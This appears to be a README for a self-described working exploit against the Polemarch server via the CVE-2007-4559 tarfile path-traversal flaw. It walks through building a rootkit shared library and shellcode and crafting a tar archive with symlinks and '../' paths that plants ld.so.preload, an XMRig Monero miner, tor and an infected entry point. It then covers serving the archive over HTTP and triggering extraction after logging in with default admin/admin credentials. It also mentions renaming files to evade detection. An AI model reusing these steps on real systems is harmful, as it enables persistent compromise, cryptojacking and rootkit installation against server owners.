# CVE-2007-4559 - Polemarch exploit 
Full working exploit for Polemarch server https://www.polemarch.org/, using CVE-2007-4559, allowing:

- Injection of a cryptominer for monero 
- Injection of a rootkit


## POC
Proof of concept using https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4559 
and based on the work from https://www.trellix.com/en-us/about/newsroom/stories/research/tarfile-exploiting-the-world.html.

### Directories to attack
We want to be able to deploy the following files:

- /usr/local/lib
  - -> **rootkit.so**: library to load
- /etc
  - -> **ld.so.preload**: library to load before any other library
- /opt/polemarch/bin
  - -> **polemarchctl**: infected docker entry point
- /usr/bin
  - -> **xmring**: miner
  - -> **tor**: tor

Note: in the real exploit we would change some names to avoid detection.

### Notes
- Binary files MUST have executable permissions
- Tar's can not be deployed twice
- Malware will be placed in an auxiliar folder which will be symlinked to target folder

## Instructions
In order to deploy the malware we will have to set up:

- Compile necessary binaries
- Polemarch server with malicious python
- Create server hosting the compromised tar files

## Compile binaries

We will need to compile the rootkit shared library and the shellcode:

```bash
$(rootkit): make
$(shellcode): gcc -z execstack -m32 -o shellcode shell.c
```

### Polemarch server
First, deploy the polemarch server with the malicious server:

```bash
$: docker compose build 
$: docker compose up -d
```

And open the web interface at http://localhost:8080

### Generate tar files
The tar files will be generated in the `poc/tar/` folder.

But first, we need to set up all the files for generating the tar correctly.

1. Copy the binaries to the `poc` folder:

```bash
$: cp cryptominer/tor poc/
$: cp crytominer/xmrig poc/
```

2. Generate the rootkit shared library in the `poc/rootkit` folder:

```bash
$(rootkit): make
```

3. Copy the rootkit shared library to the `poc` folder:

```bash
$: cp rootkit/rootkit.so poc/
```

And then we can generate the tar files:

```bash
# Execute tar files generator
$: python3 tar.py
[*] Creating symlink aaaa -> etc/
[*] Creating symlink bbbb -> usr/local/lib/
[*] Creating symlink cccc -> usr/bin/
[*] Creating symlink dddd -> opt/polemarch/bin/
[*] Changing aaaa to ../../../../../../../../../test/aaaa
[*] Changing bbbb to ../../../../../../../../../test/bbbb
[*] Changing cccc to ../../../../../../../../../test/cccc
[*] Changing dddd to ../../../../../../../../../test/dddd
[*] Changing ld.so.preload to ../../../../../../../../../test/aaaa/ld.so.preload
[*] Changing rootkit.so to ../../../../../../../../../test/bbbb/rootkit.so
[*] Changing tor to ../../../../../../../../../test/cccc/tor
[*] Changing xmrig to ../../../../../../../../../test/cccc/xmrig
[*] Changing polemarchctl to ../../../../../../../../../test/dddd/polemarchctl
[*] Removing symlink aaaa
[*] Removing symlink bbbb
[*] Removing symlink cccc
[*] Removing symlink dddd
```

This will generate the following tar files:
- `poc/tar/rootkit.tar.gz`: tar file with the malware

### Server hosting the tar files
Host the tar files, for example with python:
```bash
$: cd poc/tar
$: python -m http.server 3005
```

Log in to the polemarch server using default password (admin/admin) and
create a project with a the compromised tar file:

![PROJECT](https://user-images.githubusercontent.com/60936394/206489889-e48ef2fa-3bf8-4df7-b5bf-6c5a6cdec872.png)

"Sync" the project, which will untar untar our compromised tar.

Note: the server hosting IP must be accessible from the docker of virtual machine

## Disclaimer
This project is for research purposes only and should not be used for any illegal or malicious activities. The creators of this project are not responsible for any harm or damage caused by the misuse of this software.
